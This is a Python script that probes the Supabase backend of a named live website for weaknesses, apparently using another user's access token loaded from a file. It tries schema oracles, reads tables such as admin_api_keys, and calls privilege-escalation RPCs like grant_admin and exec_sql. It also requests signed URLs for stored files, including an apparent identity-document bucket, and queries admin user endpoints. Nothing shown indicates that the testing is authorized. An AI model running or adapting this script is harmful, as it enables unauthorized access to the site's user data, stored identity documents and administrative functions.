#!/usr/bin/env python3
# Supabase-angle probe round 1 (read-only): schema exposure, RPC signatures, storage signing, GoTrue new endpoints
import json, sys, time, urllib.request, urllib.error, ssl

BASE = "https://cdn.onlyfakeai.ru"
PK = "<publishable-key>"
TOK = json.load(open("their_token.txt"))["access_token"]
UA = "Mozilla/5.0 (supa-angle-probe)"
ctx = ssl.create_default_context()

reqs = 0
def call(method, path, headers=None, body=None, note=""):
    global reqs
    url = BASE + path
    h = {"apikey": PK, "User-Agent": UA}
    if headers: h.update(headers)
    data = None
    if body is not None:
        data = body if isinstance(body, bytes) else json.dumps(body).encode()
        h.setdefault("Content-Type", "application/json")
    r = urllib.request.Request(url, data=data, headers=h, method=method)
    t0 = time.time()
    try:
        with urllib.request.urlopen(r, timeout=20, context=ctx) as resp:
            txt = resp.read(1200).decode("utf-8", "replace")
            st, rh = resp.status, dict(resp.headers)
    except urllib.error.HTTPError as e:
        txt = e.read(1200).decode("utf-8", "replace")
        st, rh = e.code, dict(e.headers)
    except Exception as e:
        st, rh, txt = "ERR", {}, repr(e)
    reqs += 1
    interesting = {k: v for k, v in rh.items() if k.lower() in
                   ("sb-gateway-version","sb-project-ref","sb-request-id","x-sb-version","server","content-type",
                    "x-powered-by","allow","access-control-allow-origin","www-authenticate","x-ratelimit-limit",
                    "x-ratelimit-remaining","retry-after")}
    print(f"\n### [{reqs}] {note or path} -> {st} ({time.time()-t0:.2f}s)")
    print("HD:", json.dumps(interesting, ensure_ascii=False))
    print("BODY:", txt.replace("\n", " ")[:900])
    time.sleep(0.35)
    return st, rh, txt

print("== A. baseline ==")
call("GET", "/auth/v1/settings")
call("GET", "/auth/v1/.well-known/jwks.json")
call("GET", "/auth/v1/health")
call("GET", "/rest/v1/", headers={"Accept": "application/openapi+json"}, note="REST root openapi")
call("GET", "/rest/v1/profiles?select=user_id&limit=1", note="profiles anon")
call("GET", "/rest/v1/profiles?select=user_id&limit=1", headers={"Authorization": "Bearer " + TOK}, note="profiles auth")

print("\n== B. Accept-Profile schema oracle ==")
for prof in ["public", "graphql_public", "storage", "auth", "pg_catalog", "information_schema", "extensions", "realtime", "supabase_migrations", "vault"]:
    call("GET", "/rest/v1/profiles?select=*&limit=1", headers={"Accept-Profile": prof}, note=f"Accept-Profile={prof}")

print("\n== C. tables ==")
call("GET", "/rest/v1/messages?select=*&limit=3", note="messages anon")
call("GET", "/rest/v1/messages?select=*&limit=3", headers={"Authorization": "Bearer " + TOK}, note="messages auth")
call("GET", "/rest/v1/admin_api_keys?select=*&limit=3", note="admin_api_keys anon")
call("GET", "/rest/v1/admin_api_keys?select=*&limit=3", headers={"Authorization": "Bearer " + TOK}, note="admin_api_keys auth")

print("\n== D. RPC signature oracle (safe: nonexistent body/args only) ==")
call("POST", "/rest/v1/rpc/get_total_counts", body={})
call("POST", "/rest/v1/rpc/is_admin", body={})
for fn in ["grant_plan_credits", "deduct_credits", "deduct_generation", "credit_tokens_after_payment",
           "remove_watermark_and_deduct_token", "cleanup_expired_payment_assignments", "get_jobs_time_series",
           "get_profiles_time_series"]:
    call("POST", f"/rest/v1/rpc/{fn}", body={}, note=f"rpc {fn} empty-body hint")
for fn in ["set_role", "grant_admin", "update_role", "admin_set_role", "promote_admin", "exec_sql", "query"]:
    call("POST", f"/rest/v1/rpc/{fn}", body={}, note=f"rpc {fn} probe")

print("\n== E. storage ==")
call("GET", "/storage/v1/bucket", note="bucket list anon")
call("GET", "/storage/v1/bucket", headers={"Authorization": "Bearer " + TOK}, note="bucket list auth")
call("POST", "/storage/v1/object/list/photos", body={"prefix": "", "limit": 1, "offset": 0}, note="list photos anon")
call("POST", "/storage/v1/object/sign/photos/1778112266686_preview.png", body={"expiresIn": 60}, note="sign photos anon")
call("POST", "/storage/v1/object/sign/photos/scope-probe-nonexistent-1730000000.txt", body={"expiresIn": 60}, note="sign nonexistent path anon")
call("POST", "/storage/v1/object/sign/id/ID_ALBANIA_2024-EXAMPLE.jpg", body={"expiresIn": 60}, note="sign other bucket anon")
call("POST", "/storage/v1/object/sign/backgrounds/x.txt", body={"expiresIn": 60}, note="sign backgrounds anon")

print("\n== F. gotrue new endpoints ==")
call("GET", "/auth/v1/.well-known/openid-configuration")
call("GET", "/auth/v1/oauth/authorize?response_type=code&client_id=probe&redirect_uri=https%3A%2F%2Fexample.com%2Fcb", note="oauth authorize")
call("GET", "/auth/v1/sso/saml/metadata", note="saml metadata")
call("GET", "/auth/v1/scim/v2/Users", note="scim users")
call("GET", "/auth/v1/admin/users", note="admin users anon")
call("GET", "/auth/v1/admin/users", headers={"Authorization": "Bearer " + TOK}, note="admin users user-token")
call("GET", "/auth/v1/user", headers={"Authorization": "Bearer " + TOK}, note="user self")
call("GET", "/auth/v1/factors", headers={"Authorization": "Bearer " + TOK}, note="mfa factors self")
call("GET", "/auth/v1/passkeys", headers={"Authorization": "Bearer " + TOK}, note="passkeys probe")
call("GET", "/auth/v1/health?probe=1", note="health2")

print(f"\nTOTAL REQUESTS: {reqs}")
